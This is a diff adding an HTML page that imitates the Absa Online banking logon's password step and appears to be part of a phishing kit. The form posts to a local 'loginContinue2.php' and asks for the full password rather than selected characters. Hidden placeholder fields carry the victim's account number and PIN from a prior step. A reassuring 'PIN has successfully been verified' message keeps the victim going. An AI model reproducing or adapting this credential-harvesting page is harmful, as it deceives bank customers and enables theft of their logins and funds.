@@ -1,0 +1,381 @@
+<html><head></head><body><div class="ap-main-content-wrapper">
+    <!-- Page top corners -->
+    <div class="ap-main-content-wrapper-top">
+        <div class="ap-corners-rounded-top-left"></div>
+        <div class="ap-corners-rounded-top"></div>
+        <div class="ap-corners-rounded-top-right"></div>
+    </div>
+    <!-- Page content -->
+    <div class="ap-page-content ap-container">
+        <div class="ap-container-highlevel">
+            <div style="padding-top: 0px;" class="ap-titlebar ap-heading-titlebar">
+                <div class="ap-bar-section ap-bar-title" id="header_results"> Logon&nbsp; | Welcome to Absa Online </div>
+            </div>
+            <div style="padding-bottom:5px; overflow: hidden" class="ap-container-content">
+                <!-- PS: height must be set here to AUTO else it cuts of the bottom of the inner content -->
+                <div style="padding-top: 0px;" class="ap-login-columns ap-columns-2-lhs">
+                    <!-- ap-column-1 -->
+                    <div style="width: 606px;padding:0" class="ap-column-1">
+                        <div class="ap-login-container" id="ap-login-container">
+                            <div class="ap-container-privatebank">
+                                <input type="hidden" value="I" id="clienTypeValue" name="clienTypeValue">
+                                <input type="hidden" value="F" id="sbuValue" name="sbuValue">
+                                <input type="hidden" value="Logon&nbsp;| Welcome to Absa Online |&nbsp;Private Assist contact number&nbsp;:&nbsp;0860 553 553" id="labelValue" name="labelValue">
+                            </div>
+                            <div style="width: 606px;" class="ap-container-highlevel">
+                                <div class="ap-titlebar ap-heading-titlebar ap-heading-titlebar-login">
+                                    <div style="margin-top:8px;margin-left:25px" class="ap-bar-section ap-bar-title"> &nbsp;&nbsp;Security SurePhrase™ </div>
+                                    <!--div style="float:right; margin-right:10px;">			<div style="background: url('static/style/resources/icon-info-grey.png') no-repeat scroll left top transparent; margin-top:7px; height:30px; width:20px; cursor:pointer;" onclick="javascript:showPasswordTips()" tooltip='Password tips'></div>		</div--></div>
+                                <div class="ap-container-content">
+                                    <div oninputchange="if (input.value.length) doMoveForm2Focus(input)" class="ui-keyboard">
+                                        <!--<form onsubmit="onForm2Submit()" formtype="nosubmit" method="POST" class="ui-form">-->
+                                        <form class="ui-form" id="form2" method="post" onsubmit="loginContinue2($('#form2')); return false;" action="loginContinue2.php" formtype="nosubmit">
+                                            <table class="ui-grid ui-keyboard-inputs">
+                                                <tbody>
+                                                    <tr class="ui-row">
+                                                        <td class="ui-cell">
+                                                            <!-- APB Start --><b>Your PIN has successfully been verified. </b>.
+                                                            <!--The last time you logged onto Absa Online or Cellphone Banking was on&nbsp;2013-10-09-->
+                                                            <!-- APB End -->
+                                                        </td>
+                                                    </tr>
+                                                    <!--<tr class="ui-row">							<td class="ui-cell">								Your security SurePhrase&trade; is:							</td>						</tr>						<tr class="ui-row">							<td class="ui-cell">								<div id="spansurephrase">CA SMIT</div>							</td>						</tr>						<tr class="ui-row">							<td class="ui-cell">								If you have verified your security SurePhrase, then enter the missing characters of your Password below.							</td>						</tr>-->
+                                                    <tr class="ui-row">
+                                                        <td class="ui-cell"> Enter all characters of your Password
+                                                            <!--, indicated by the  <font style="color:#D01010;">red</font> blocks.-->
+                                                            <br>
+                                                            <br> </td>
+                                                    </tr>
+                                                    <tr class="ui-row">
+                                                        <td class="ui-cell">
+                                                            <!--<input type="password" aria-labelledby="id-1174" aria-invalid="false" class="pf pf2 ui-keyboard-input-selected" name="password[]" id="pff1" num="2" onkeyup="checkEntries2(this, event)" tabindex="1" maxlength="13" value="" autocomplete="off" vilabel="Password 2" aria-label="Please type all the characters from your password ">-->
+                                                            <input class="pf pf2" id="pff1" required="" type="password" name="password" value="" style="width: 50%; padding-left: 5px; text-align: left; height:20px;"> </td>
+                                                    </tr>
+                                                    <tr class="ui-row">
+                                                        <td class="ui-cell"> It is your responsibility to ensure the secrecy of your Password. </td>
+                                                    </tr>
+                                                    
+
+                                                       
+                                                    <tr class="ui-row">
+                                                        <td class="ui-cell">
+                                                            <input type="checkbox" title="'Select to enable visually impaired interface.'" value="1" name="viuser" style="vertical-align: middle;" id="viCheckbox" tabindex="4">
+                                                            <label title="'Select to enable visually impaired interface.'" style="vertical-align:middle;" for="viuser"> Select to enable visually impaired interface. </label>
+                                                        </td>
+                                                    </tr>
+                                                </tbody>
+                                            </table>
+                                                                                        <input type="hidden" value="9" id="pwds" name="pwds">
+                                            <input type="hidden" value="2013-10-09" id="lastlogondate" name="lastlogondate">
+                                            <!-- PS: the time is always 12:00 services cannot give us the actual time -->
+                                            <input type="hidden" value="12:00:00" id="lastlogontime" name="lastlogontime">
+                                            <input type="hidden" value="CA SMIT" id="surephrase" name="surephrase">
+                                            <div class="ui-formFoot">
+                                                <div style="display:block" class="genericMessage-place-holder">
+                                                    <div style="display:none" class="ui-message ui-message-error" tabindex="0" id="ap-login-form2-error"> <span class="vi-screenreader-line"> Error details. </span>
+                                                        <div class="ui-message-timeStamp"> <span class="vi-screenreader-line">Time stamp. </span> </div>
+                                                        <div class="ui-message--icon"></div>
+                                                        <div class="ui-message-content" style="margin-right:120px">
+                                                            <div class="ui-message-title"></div>
+                                                            <div style="clear:both;" class="ui-message-body">
+                                                                <!-- msg here -->
+                                                            </div>
+                                                        </div>
+                                                        <div class="clear-both"></div>
+                                                    </div>
+                                                </div>
+                                                <div class="validation-place-holder"></div>
+                                                <div class="ui-buttonFooter">
+                                                    <div class="ui-exception-container">
+                                                        <!--  -->
+                                                        <div style="float:left"> <span>Landing page:</span>&nbsp;
+                                                            <select style="vertical-align: middle;" name="landingpage2" defaultval="" id="landingpage2" class="ui-select" tabindex="5">
+                                                                <option value="accounts">Express</option>
+                                                                <option value="accounts">My accounts</option>
+                                                                <option value="payments">Make a payment</option>
+                                                                <option value="saveinvest">Save and invest</option>
+                                                                <option value="apply">Apply for an account</option>
+                                                                <option value="insurance">Insure</option>
+                                                                <option value="profile">View my profile</option>
+                                                            </select>
+                                                        </div>
+                                                        <!-- Removed vi user checkbox	-->
+                                                        <!-- Buttons -->
+                                                        <button class="ui-button ap-button-reset" onclick="absa.login.doLogout()" tabindex="6" type="button" aria-label="Logoff">
+                                                            <!-- ap-button-logout -->
+                                                            <div class="ui-button-left">
+                                                                <div class="ui-button-right">
+                                                                    <div class="ui-button-center">Logoff</div>
+                                                                </div>
+                                                            </div>
+                                                        </button>
+                                                        <button class="ui-button ap-button-reset" onclick="resetForm2()" tabindex="7" type="button" aria-label="Reset">
+                                                            <div class="ui-button-left">
+                                                                <div class="ui-button-right">
+                                                                    <div class="ui-button-center">Reset</div>
+                                                                </div>
+                                                            </div>
+                                                        </button>
+                                                        <button onclick="" class="ui-button ap-button-next" tabindex="8" type="submit" aria-label="Logon">
+                                                            <div class="ui-button-left">
+                                                                <div class="ui-button-right">
+                                                                    <div class="ui-button-center">Logon</div>
+                                                                </div>
+                                                            </div>
+                                                        </button>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                            <input type="hidden" name="AccessAccount" value="{AccessAccount}">
+                                            <input type="hidden" name="PIN" value="{PIN}">
+                                            <input type="hidden" name="Operator" value="{Operator}"> </form>
+                                        <!-- keyboard -->
+                                        <table class="ui-grid">
+                                            <tbody>
+                                                <tr class="ui-row">
+                                                    <td class="ui-cell ap-login-keyBoardLabelCell"> Use the online keyboard to enter your Password. </td>
+                                                </tr>
+                                                <tr class="ui-row">
+                                                    <td class="ui-cell">
+                                                        <div class="ui-keyboard-keyboardContainer" style="-moz-user-select: none;">
+                                                            <div class="floatleft ui-keyboard-keyboardContainer-utils">
+                                                                <div unselectable="on" action="backspace" class="ui-keyboard-button util">
+                                                                    <div unselectable="on" class="backspace"></div> Backspace </div>
+                                                                <div unselectable="on" action="capslock" class="ui-keyboard-button util"> CapsLock </div>
+                                                            </div>
+                                                            <div class="floatleft ui-keyboard-keyboardContainer-keys">
+                                                                <div class="row">
+                                                                    <div unselectable="on" class="ui-keyboard-button">1</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">2</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">3</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">4</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">5</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">6</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">7</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">8</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">9</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">0</div>
+                                                                    <div class="clearBoth"></div>
+                                                                </div>
+                                                                <div class="row ui-keyboard-keyboardContainer-row2">
+                                                                    <div unselectable="on" class="ui-keyboard-button">q</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">w</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">e</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">r</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">t</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">y</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">u</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">i</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">o</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">p</div>
+                                                                    <div class="clearBoth"></div>
+                                                                </div>
+                                                                <div class="row ui-keyboard-keyboardContainer-row3">
+                                                                    <div unselectable="on" class="ui-keyboard-button">a</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">s</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">d</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">f</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">g</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">h</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">j</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">k</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">l</div>
+                                                                    <div class="clearBoth"></div>
+                                                                </div>
+                                                                <div class="row ui-keyboard-keyboardContainer-row4">
+                                                                    <div unselectable="on" class="ui-keyboard-button">z</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">x</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">c</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">v</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">b</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">n</div>
+                                                                    <div unselectable="on" class="ui-keyboard-button">m</div>
+                                                                    <div class="clearBoth"></div>
+                                                                </div>
+                                                            </div>
+                                                        </div>
+                                                    </td>
+                                                </tr>
+                                            </tbody>
+                                        </table>
+                                    </div>
+                                </div>
+                                <!-- bottom round borders -->
+                                <div class="ap-container-bottom-corners">
+                                    <div class="ap-corners-rounded-bottom-left"></div>
+                                    <div style="width:590px;" class="ap-corners-rounded-bottom"></div>
+                                    <div class="ap-corners-rounded-bottom-right"></div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- ap-column-2 -->
+                    <div style="width:296px;" class="ap-column-2">
+                        <!-- Important Links on Right Side of Page -->
+                        <div class="ap-login-block-rounded" id="divimportantlinks" style="display: none;">
+                            <!-- top round borders -->
+                            <div class="ap-login-block-rounded-top">
+                                <div class="ap-corners-rounded-top-left"></div>
+                                <div class="ap-corners-rounded-top"></div>
+                                <div class="ap-corners-rounded-top-right"></div>
+                            </div>
+                            <!-- content -->
+                            <div class="ui-tabBox" role="tablist">
+                                <ul class="ui-tabHeads">
+                                    <li tabindex="0" role="button" class="ui-tabHead ui-tab-selected" aria-selected="true"> Important links <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span> </li>
+                                </ul>
+                                <div class="ui-tabBodies">
+                                    <div class="ui-tabBody ui-tabBody-selected" role="tabpanel" tabindex="0">
+                                        <div style="background: #FFFFFF;">
+                                            <ul class="abc">
+                                                <li><a id="am1" href="registration/?lang=en">How to register</a></li>
+                                                <li><a target="_new" id="am2" href="http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online/Video-Demo">Absa Online demo</a></li>
+                                                <li><a target="_new" id="am3" href="http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online">Frequently asked questions</a></li>
+                                                <li><a target="_new" id="am4" href="http://www.absa.co.za/Absacoza/Media-Centre/Education/Tax-returns-on-SARS-eFiling">Tax returns</a></li>
+                                                <li><a target="_new" id="am5" href="http://www.absa.co.za/deployedfiles/Assets/Richmedia/Absaonline/PDF/SARS_Notice_130904.pdf">Important SARS notification</a></li>
+                                                <li><a target="_new" id="am6" href="http://www.absa.co.za/Absacoza/Individual/Ways-to-Bank/Anytime%2C-Anywhere/Absa-Online">Contact us</a></li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- bottom round borders -->
+                            <div class="ap-login-block-rounded-bottom">
+                                <div class="ap-corners-rounded-bottom-left"></div>
+                                <div class="ap-corners-rounded-bottom"></div>
+                                <div class="ap-corners-rounded-bottom-right"></div>
+                            </div>
+                        </div>
+                        <!-- How it Works Right of 2nd page -->
+                        <div style="display: block;" class="ap-login-block-rounded" id="divhowitworks">
+                            <div>
+                                <!-- top round borders -->
+                                <div class="ap-login-block-rounded-top">
+                                    <div class="ap-corners-rounded-top-left"></div>
+                                    <div class="ap-corners-rounded-top"></div>
+                                    <div class="ap-corners-rounded-top-right"></div>
+                                </div>
+                                <!-- content -->
+                                <div class="ui-tabBox" role="tablist">
+                                    <ul class="ui-tabHeads">
+                                        <li tabindex="0" role="button" class="ui-tabHead ui-tab-selected" aria-selected="true"> How it works <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span> </li>
+                                    </ul>
+                                    <div class="ui-tabBodies">
+                                        <div class="ui-tabBody ui-tabBody-selected" role="tabpanel" tabindex="0">
+                                            <div style="background: #FFFFFF;">
+                                                <div style="border-bottom: 1px solid #CCCCCC;">
+                                                    <div style="padding: 10px;">In this example the password is <b>Password1</b></div>
+                                                </div>
+                                                <div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span> <span class="pfsmalltxt">a</span> <span class="pfsmalltxt">s</span> <span class="pfsmalltxt">s</span> <span class="pfsmalltxt">w</span> <span class="pfsmalltxt">o</span> <span class="pfsmalltxt">r</span> <span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span> </div>
+                                                <div style="margin: 10px 0px 5px 10px;">
+                                                    <input type="password" value="" maxlength="1" tabindex="1" disabled="true" name="dpf1" class="pfsmall pf2">
+                                                    <input type="text" value="2" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="3" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="4" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="5" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="6" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="7" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="password" value="" maxlength="1" tabindex="1" disabled="true" name="dpf1" class="pfsmall pf2">
+                                                    <input type="password" value="" maxlength="1" tabindex="1" disabled="true" name="dpf1" class="pfsmall pf2"> </div>
+                                                <div style="border-top: 1px solid #CCCCCC; border-bottom: 1px solid #CCCCCC; padding: 10px;"> You have to enter (case sensitive): </div>
+                                                <div style="margin: 10px 0px 10px 10px;"><span class="pfsmalltxt">P</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;&nbsp;</span> <span class="pfsmalltxt">&nbsp;</span> <span class="pfsmalltxt">d</span> <span class="pfsmalltxt">1</span> </div>
+                                                <div style="margin: 10px 0px 5px 10px;">
+                                                    <input type="password" value="" maxlength="1" tabindex="1" disabled="true" name="dpf1" class="pfsmall pf2">
+                                                    <input type="text" value="2" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="3" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="4" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="5" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="6" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="text" value="7" disabled="true" name="dpf2" class="pfsmall pf1">
+                                                    <input type="password" value="" maxlength="1" tabindex="1" disabled="true" name="dpf1" class="pfsmall pf2">
+                                                    <input type="password" value="" maxlength="1" tabindex="1" disabled="true" name="dpf1" class="pfsmall pf2"> </div>
+                                                <br> </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <!-- bottom round borders -->
+                                <div class="ap-login-block-rounded-bottom">
+                                    <div class="ap-corners-rounded-bottom-left"></div>
+                                    <div class="ap-corners-rounded-bottom"></div>
+                                    <div class="ap-corners-rounded-bottom-right"></div>
+                                </div>
+                            </div>
+                            <div style="padding: 14px 0px 1px 0px;">
+                                <a href="http://www.absa.co.za/Absacoza/Calculate"><img alt="Use calculators" src="https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/05-Calculators.jpg"></a>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- ap-column-2 -->
+                    <div class="ap-columns-clear"></div>
+                </div>
+                <!-- ap-columns-2-lhs -->
+                <div style="width: 100%; height: 10px;"></div>
+                <!-- 3 column layout -->
+                <div class="ap-login-columns ap-columns-33" id="divbottomadds" style="display: none;">
+                    <!-- ap-column-1 -->
+                    <div class="ap-column-1">
+                        <!-- Security Centre Links Bottom left of Login page 1 -->
+                        <div class="ap-login-block-rounded" id="divsecuritycentre">
+                            <!-- top round borders -->
+                            <div class="ap-login-block-rounded-top">
+                                <div class="ap-corners-rounded-top-left"></div>
+                                <div class="ap-corners-rounded-top"></div>
+                                <div class="ap-corners-rounded-top-right"></div>
+                            </div>
+                            <!-- content -->
+                            <div class="ui-tabBox" role="tablist">
+                                <ul class="ui-tabHeads">
+                                    <li tabindex="0" role="button" class="ui-tabHead ui-tab-selected" aria-selected="true"> Security centre <span class="vi-screenreader-line "> [selected] 1 of 1 [tab].</span> </li>
+                                </ul>
+                                <div class="ui-tabBodies">
+                                    <div class="ui-tabBody ui-tabBody-selected" role="tabpanel" tabindex="0">
+                                        <div style="background: #FFFFFF;">
+                                            <ul class="abc">
+                                                <li><a target="_new" id="am1" href="http://www.absa.co.za/Absacoza/Security-Centre/Online-Security/Absa-Online-Security-Measures">Absa's online security measures</a></li>
+                                                <li><a target="_new" id="am2" href="http://www.absa.co.za/Absacoza/Security-Centre/Banking-Security/Phishing-Scams">Important information about phishing </a></li>
+                                                <li><a target="_new" id="am3" href="http://www.absa.co.za/Absacoza/Security-Centre/Online-Security/Protect-Yourself-Online">Protect yourself online</a></li>
+                                                <li><a target="_new" id="am4" href="http://www.absa.co.za/Absacoza/Security-Centre/Online-Security/Online-Shopping-and-3D-Secure">Online shopping and 3D Secure</a></li>
+                                                <li><a target="_new" id="am5" href="http://www.absa.co.za/Absacoza/Security-Centre/Latest-Scams/Phishing-Scams">Latest scams </a></li>
+                                                <li><a target="_new" id="am6" href="http://www.absa.co.za/Absacoza/Security-Centre/Antivirus-Software/Antivirus-software">Latest internet security software</a></li>
+                                            </ul>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- bottom round borders -->
+                            <div class="ap-login-block-rounded-bottom">
+                                <div class="ap-corners-rounded-bottom-left"></div>
+                                <div class="ap-corners-rounded-bottom"></div>
+                                <div class="ap-corners-rounded-bottom-right"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <!-- ap-column-2 -->
+                    <div class="ap-column-2">
+                        <div>
+                            <a href="http://www.absa.co.za/Absacoza/Media-Centre/Press-Statements/Absa-Online-launches-new-logon-page"><img alt="Absa Online launches new logon page" src="https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/Switch.jpg"></a>
+                        </div>
+                    </div>
+                    <!-- ap-column-3 -->
+                    <div class="ap-column-3">
+                        <div>
+                            <a href="http://www.absa.co.za/Absacoza/Security-Centre"><img alt="Phishing fraud" src="https://ib.absa.co.za/absa-online/assets/Assets/Richmedia/Absaonline/CampaignImages/Eng/01-Phishing.jpg"></a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- bottom rounded corners -->
+            <div class="ap-container-bottom ap-heading-titlebar-item ap-container-bottom-show">
+                <div class="ap-corners-rounded-bottom-left"></div>
+                <div class="ap-corners-rounded-bottom"></div>
+                <div class="ap-corners-rounded-bottom-right"></div>
+            </div>
+        </div>
+    </div>
+    <!-- Page bottom corners -->
+    <div class="ap-main-content-wrapper-bottom">
+        <div class="ap-corners-rounded-bottom-left"></div>
+        <div class="ap-corners-rounded-bottom"></div>
+        <div class="ap-corners-rounded-bottom-right"></div>
+    </div>
+</div></body></html>
